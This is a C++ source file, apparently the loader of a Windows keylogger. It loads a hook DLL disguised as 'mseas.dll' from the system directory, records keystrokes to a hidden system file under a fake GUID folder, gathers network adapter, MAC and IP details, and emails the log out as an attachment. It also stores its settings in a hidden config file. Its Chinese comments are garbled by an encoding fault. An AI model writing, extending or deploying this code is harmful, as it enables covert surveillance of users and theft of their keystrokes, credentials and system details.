// setkeyhook.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "mail.h"
#include<time.h>
#include <WinSock.h>
#include <Iphlpapi.h>
#include <Userenv.h>
#pragma comment(lib, "Userenv.lib")
typedef BOOL (*StartHook)();
typedef BOOL(*StopHook)();
int count = 0;

int DataToFile(char* buff)
{
	SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al", FILE_ATTRIBUTE_NORMAL);
	if (GetLastError() == 3)
	{
		CreateDirectory("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}", NULL);
		SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al", FILE_ATTRIBUTE_NORMAL);
	}
	HANDLE hFil = CreateFile("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	//HANDLE hFil = CreateFile("d:\\data.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFil == INVALID_HANDLE_VALUE)
	{
		int a;
		a = GetLastError();
		char buf[10];
		wsprintf(buf, "%d", a);
		//MessageBox(NULL, "Createfile error", buf, 0);
		printf("createfile error\n");
		return 0;
	}
	if (SetFilePointer(hFil, 0, NULL, FILE_END) == -1)
	{
		//MessageBox(NULL, "setfilePointer error", "a", 0);
		printf("setfilePointer error\n");
		return 0;
	}
	DWORD dwWrite;
	if (!WriteFile(hFil, buff, strlen(buff), &dwWrite, NULL))
	{
		//MessageBox(NULL, "WriteFile error", "a", 0);
		printf("WriteFile error\n");
		return 0;
	}
	SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al", FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	CloseHandle(hFil);
	return 0;
}
BOOL ReadFile(char *name, int &ifEmail, int &ifkeyboard)
{
	SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\conf.al", FILE_ATTRIBUTE_NORMAL);
	FILE *fpTable;
	int b, c;
	char a[256];
	//fpTable = fopen("D:\\conf.txt", "r+");
	fpTable = fopen("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\conf.al", "r+");	
	/*���������ʱ�����������������Ϣ,�����������*/
	if (fpTable == NULL)
	{
		return FALSE;
	}

	//fprintf(fpTable, "%s%ld%f%c", "a-string", 65000, 3.14159, 'x');
	/*��ָ���������ļ���ͷ*/
	/*���ļ��ж�ȡ����*/
	fscanf(fpTable, "%s %d %d", name, &ifEmail, &ifkeyboard); 
	SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\conf.al", FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

	fclose(fpTable);
	return TRUE;
}
BOOL WriteFile(char *name, int ifEmail, int ifkeyboard)
{
	SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\conf.al", FILE_ATTRIBUTE_NORMAL);
	if (GetLastError() == 3)
	{
		CreateDirectory("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}", NULL);
		SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\conf.al", FILE_ATTRIBUTE_NORMAL);
	}
	FILE *fpTable;
	//fpTable = fopen("D:\\conf.txt", "w+");
	fpTable = fopen("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\conf.al", "w+");
	if (fpTable == NULL)
	{
		return FALSE;
	}

	fprintf(fpTable, "%s %d %d", name, ifEmail, ifkeyboard);
	fclose(fpTable);
	SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\conf.al", FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	return TRUE;
}
int main()
{
	/*
	char szCommandLine[] = "notepad";
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	si.dwFlags = STARTF_USESHOWWINDOW;//ָ��wShowWindow��Ա��Ч
	si.wShowWindow = TRUE;//�˳�Ա��ΪTRUE�Ļ�����ʾ�½����̵�������
	CreateProcess(
		NULL,//���ڴ�ָ����ִ���ļ����ļ���
		szCommandLine,//�����в���
		NULL,//Ĭ�Ͻ��̰�ȫ��
		NULL,//Ĭ�Ͻ��̰�ȫ��
		FALSE,//ָ����ǰ�����ھ�������Ա��ӽ��̼̳�
		CREATE_NEW_CONSOLE,//Ϊ�½��̴���һ���µĿ���̨����
		NULL,//ʹ�ñ����̵Ļ�������
		NULL,//ʹ�ñ����̵���������Ŀ¼
		&si,
		&pi);*/
	//MessageBox(NULL, "ASD", "ASD", 0);
	char szFilePath[MAX_PATH + 1] = { 0 };
	GetModuleFileName(NULL, szFilePath, MAX_PATH);
	
	char qwe[256];
	GetKeyboardLayoutName(qwe);
	char *qwer;
	qwer = qwe + 4;
	if (strcmp(qwer, "0804") == 0)
	{
		keybd_event(0xA2, 0, 0, 0);
		keybd_event(0xA0, 0, 0, 0);
		keybd_event(0xA0, 0, KEYEVENTF_KEYUP, 0);
		keybd_event(0xA2, 0, KEYEVENTF_KEYUP, 0);
		Sleep(10000);
	
		WinExec(szFilePath, SW_SHOW);

		return 0;
	}

	char name[256], buf1[256];
	int a, b;
	char buff[4096];
	char *kk;
	kk = NULL;
	char buf[128];
	if (FALSE == ReadFile(name, a, b))
	{
		strcpy(name, "lucy");
		a = 1;
		b = 0;
		WriteFile(name, a, b);
		DataToFile("");

	}
	if (b == 0)
	{

		return 0;
	}

	time_t timep;
	struct tm *qqq;
	time(&timep);
	qqq = localtime(&timep);
	char forVir[MAX_PATH];
	GetSystemDirectory(forVir, MAX_PATH);
	strcat(forVir, "\\mseas.dll");
	HMODULE hModule = LoadLibrary(forVir);
	//HMODULE hModule = LoadLibrary("D:\\visual Studio project\\keyboard\\Release\\keyboard.dll");
	if (hModule == NULL)
	{
		printf("module error\n");
		//system("pause");
		return 0;
	}

	StartHook NewStartHook = (StartHook)GetProcAddress(hModule, "StartHook");
	StopHook NewStopHook = (StopHook)GetProcAddress(hModule, "StopHook");
	if (NewStartHook == NULL || NewStopHook == NULL)
	{
		printf("start error\n");
	//	system("pause");
		return 0;
	}

	BOOL bRet = NewStartHook();
	if (bRet)
	{
		//DataToFile("success");
		//MessageBox(NULL, "SUCCESS", "SetKeyHOOK", 0);
	}
	else
	{
		//DataToFile("failed");
		//MessageBox(NULL, "FAILED", "SetKeyHOOK", 0);
	}
	MSG aa;
	aa.wParam = 80;
	
	aa.time = clock();
	//PostMessage(NULL, WM_CHAR, 0, (LPARAM)&aa);
	//SendMessage(HWND_BROADCAST, WM_CHAR, 0, 0);
	Sleep(1000000);
	bRet = NewStopHook();
	if (bRet)
	{
		//MessageBox(NULL, "SUCCESS", "SetKeyHOOK", 0);  
	}
	else 
	{
		//MessageBox(NULL, "FAILED", "SetKeyHOOK", 0);
	}
	
	if (a==1)
	{
		while (1 == 1)
		{
			memset(buff, 0, 4096);
			//PIP_ADAPTER_INFO�ṹ��ָ��洢����������Ϣ
			PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
			//�õ��ṹ���С,����GetAdaptersInfo����
			unsigned long stSize = sizeof(IP_ADAPTER_INFO);
			//����GetAdaptersInfo����,���pIpAdapterInfoָ�����;����stSize��������һ��������Ҳ��һ�������
			int nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
			//��¼��������
			int netCardNum = 0;
			//��¼ÿ�������ϵ�IP��ַ����
			int IPnumPerNetCard = 0;
			if (ERROR_BUFFER_OVERFLOW == nRel)
			{
				//����������ص���ERROR_BUFFER_OVERFLOW
				//��˵��GetAdaptersInfo�������ݵ��ڴ�ռ䲻��,ͬʱ�䴫��stSize,��ʾ��Ҫ�Ŀռ��С
				//��Ҳ��˵��ΪʲôstSize����һ��������Ҳ��һ�������
				//�ͷ�ԭ�����ڴ�ռ�
				delete pIpAdapterInfo;
				//���������ڴ�ռ������洢����������Ϣ
				pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
				//�ٴε���GetAdaptersInfo����,���pIpAdapterInfoָ�����
				nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
			}
			if (ERROR_SUCCESS == nRel)
			{
				//���������Ϣ
				//�����ж�����,���ͨ��ѭ��ȥ�ж�
				while (pIpAdapterInfo)
				{
					wsprintf(buf, "����index��%d\n\r", ++netCardNum);
					strcat(buff, buf);
					wsprintf(buf, "�������ƣ�%s\n\r", pIpAdapterInfo->AdapterName);
					strcat(buff, buf);
					wsprintf(buf, "����������%s\n\r", pIpAdapterInfo->Description);
					strcat(buff, buf);
					switch (pIpAdapterInfo->Type)
					{
					case MIB_IF_TYPE_OTHER:
						wsprintf(buf, "�������ͣ�OTHER\n\r");
						strcat(buff, buf);
						break;
					case MIB_IF_TYPE_ETHERNET:
						wsprintf(buf, "�������ͣ�ETHERNET\n\r");
						strcat(buff, buf);
						break;
					case MIB_IF_TYPE_TOKENRING:
						wsprintf(buf, "�������ͣ�TOKENRING\n\r");
						strcat(buff, buf);
						break;
					case MIB_IF_TYPE_FDDI:
						wsprintf(buf, "�������ͣ�FDDI\n\r");
						strcat(buff, buf);
						break;
					case MIB_IF_TYPE_PPP:
						wsprintf(buf, "�������ͣ�PPP\n\r");
						strcat(buff, buf);
						break;
					case MIB_IF_TYPE_LOOPBACK:
						wsprintf(buf, "�������ͣ�LOOPBACK\n\r");
						strcat(buff, buf);
						break;
					case MIB_IF_TYPE_SLIP:
						wsprintf(buf, "�������ͣ�SLIP\n\r");
						strcat(buff, buf);
						break;
					default:

						break;
					}
					wsprintf(buf, "����MAC��ַ��");
					strcat(buff, buf);
					for (DWORD i = 0; i < pIpAdapterInfo->AddressLength; i++)
						if (i < pIpAdapterInfo->AddressLength - 1)
						{
							wsprintf(buf, "%02X-", pIpAdapterInfo->Address[i]);
							strcat(buff, buf);
						}
						else
						{
							wsprintf(buf, "%02X\n", pIpAdapterInfo->Address[i]);
							strcat(buff, buf);
						}
					wsprintf(buf, "����IP��ַ���£�\n\r");
					strcat(buff, buf);
					//���������ж�IP,���ͨ��ѭ��ȥ�ж�
					IP_ADDR_STRING *pIpAddrString = &(pIpAdapterInfo->IpAddressList);
					do
					{
						wsprintf(buf, "IP ��ַ��%s\n\r", pIpAddrString->IpAddress.String);
						strcat(buff, buf);
						wsprintf(buf, "������ַ��%s\n\r", pIpAddrString->IpMask.String);
						strcat(buff, buf);
						wsprintf(buf, "���ص�ַ��%s\n\r", pIpAdapterInfo->GatewayList.IpAddress.String);
						strcat(buff, buf);
						pIpAddrString = pIpAddrString->Next;
					} while (pIpAddrString);
					pIpAdapterInfo = pIpAdapterInfo->Next;
					strcat(buff, "--------------------------------------------------------------------\n");
				}

			}
			//�ͷ��ڴ�ռ�
			if (pIpAdapterInfo)
			{
				delete pIpAdapterInfo;
			}
			strcat(buff, "\r\n");
			kk = buff;
			SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al", FILE_ATTRIBUTE_NORMAL);
			if (GetLastError() == 3)
			{
				CreateDirectory("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}", NULL);
				SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al", FILE_ATTRIBUTE_NORMAL);
			}
			else if (SendAttachFile(name, "C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al",kk) == TRUE)
			{
				DeleteFile("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al");
				return 0;
			}
			else
			{
				Sleep(100000);
				count++;
				if (count >= 10)
				{
					//SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al", FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
					wsprintf(buf1, "\r\n**************year;%d   month:%d   data:%d***********\r\n", 1900 + qqq->tm_year, 1 + qqq->tm_mon, qqq->tm_mday);
					DataToFile(buf1);
					return 0;
				}
			}
			SetFileAttributes("C:\\Users\\All Users\\{9F14A2AB-5C51-4FF1-ADDE5-7E464B74160}\\dat.al", FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
		}
		
	}
	else
	{
		wsprintf(buf1, "\r\n**************year;%d   month:%d   data:%d***********\r\n", 1900 + qqq->tm_year, 1 + qqq->tm_mon, qqq->tm_mday);
		DataToFile(buf1);
		return 0;
	}

}

